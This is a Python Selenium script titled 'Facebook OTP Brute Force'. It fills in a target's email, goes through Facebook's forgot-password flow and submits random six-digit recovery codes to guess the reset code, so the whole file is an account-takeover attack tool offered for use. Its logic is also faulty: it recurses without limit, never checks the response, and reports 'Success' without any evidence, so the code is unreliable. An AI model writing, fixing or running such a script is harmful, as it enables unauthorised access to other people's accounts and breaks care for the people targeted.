### date_created: July 7, 2022
### created by: Jhiem Alas
### to add the do while else f

import time
import random
import webbrowser
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By




# PUT YOUR EMAIL HERE OR USERNAME
# ex: myemail@email.com  or  my.email
usr_email = ""


print("\n")
print("         Facebook OTP Brute Force         \n")
print("Program started...\n")
print("wait for 10 seconds")
time.sleep(10)


driver = webdriver.Chrome()
driver.get("https://facebook.com")

email_input = driver.find_element(By.ID, "email")
print("Typing email...")
email_input.send_keys(usr_email)
email_input.send_keys(Keys.RETURN)
print("click login")
login = driver.find_element(By.NAME, "login")

time.sleep(3)
print("proceeding to Forgot Password...")
forgot_pwd = driver.find_element(By.LINK_TEXT, "Forgot password?")
forgot_pwd.click()

time.sleep(3)
# send_email = driver.find_element(By.ID, "send_email")
# send_email.click()
print("send via email method...")
continues = driver.find_element(By.TAG_NAME, "button") # continue
continues.click()
print("continue clicked\n")
print("You have 40 seconds to answer captcha....")
print("if no captcha wait for 40 seconds...")
time.sleep(40)
print("OTP Bruteforce start...\n")


# # noting current url | you can comment this if you dont want to use script2.py
# with open("current_url.txt", "w") as url:
#     url.write(driver.current_url)
#     url.close()
# print("current url:\n" + driver.current_url + "\n")
# # end here ||||

code_used = []

def test(used_code):
    # time.sleep(0.5)
    r = random.randint(111111, 999999)
    input_code = driver.find_element(By.ID, "recovery_code_entry")
    if str(r) not in used_code:
        input_code.send_keys(str(r))
        input_code.send_keys(Keys.RETURN)
        used_code.append(str(r))
        print("[+] Attempt on "+str(r))
        enter = driver.find_element(By.TAG_NAME, "button")
        enter.click()
        test(used_code)
    else:
        print(str(r) + "is used")
        test(used_code)
    print("[+] Attempt on " + str(r) + " Success!!!")
    print("The OTP code is " + str(r))

def main(used_code):
    r = random.randint(111111,999999)
    input_code = driver.find_element(By.ID, "recovery_code_entry")
    input_code.send_keys(str(r))
    input_code.send_keys(Keys.RETURN)
    print("[+] Attempt on "+str(r))
    enter = driver.find_element(By.TAG_NAME, "button")
    enter.click()
    test(used_code)
main(code_used)
